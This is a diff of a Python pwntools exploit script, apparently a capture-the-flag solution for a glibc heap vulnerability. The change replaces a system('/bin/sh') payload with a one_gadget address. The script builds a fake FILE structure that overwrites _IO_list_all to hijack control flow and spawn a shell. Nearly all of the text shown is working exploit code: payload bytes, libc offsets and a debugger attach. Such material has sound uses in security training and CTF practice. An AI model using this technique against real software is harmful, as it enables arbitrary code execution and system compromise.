@@ -5,12 +5,11 @@ elf=ELF('/lib/x86_64-linux-gnu/libc.so.6')
 
 context.log_level=1
 context.terminal = ['gnome-terminal', '-x', 'sh', '-c']
-#one_gadget=0x45216
+one_gadget=0x45216
 #one_gadget=0x4526A
 #one_gadget=0xf02a4
 #one_gadget=0xf1147
 IO_list_all=elf.symbols['_IO_list_all']
-system=elf.symbols['system']
 
 sd=lambda x: p.send(x)
 sl=lambda x: p.sendline(x)
@@ -68,14 +67,13 @@ log.info('chunk base is:'+hex(chunk_base))
 payload='a'*0x400
 payload+=p64(0)+p64(0x21)
 payload+=p64(0xddaa00000002)
-payload+=p64(0)
-payload+='/bin/sh\x00'
+payload+=p64(0)*2
 payload+=p64(0x61)
 payload+=p64(0)+p64(libc_base+IO_list_all-0x10)
 payload+=p64(0)+p64(1)
 payload+=p64(0)*21
 payload+=p64(chunk_base+0x7c0)
-payload+=p64(0)*3+p64(system+libc_base)
+payload+=p64(0)*3+p64(one_gadget+libc_base)
 
 edit(0x1111,payload)
 gdb.attach(p,gdbscript='b __libc_message\nc')
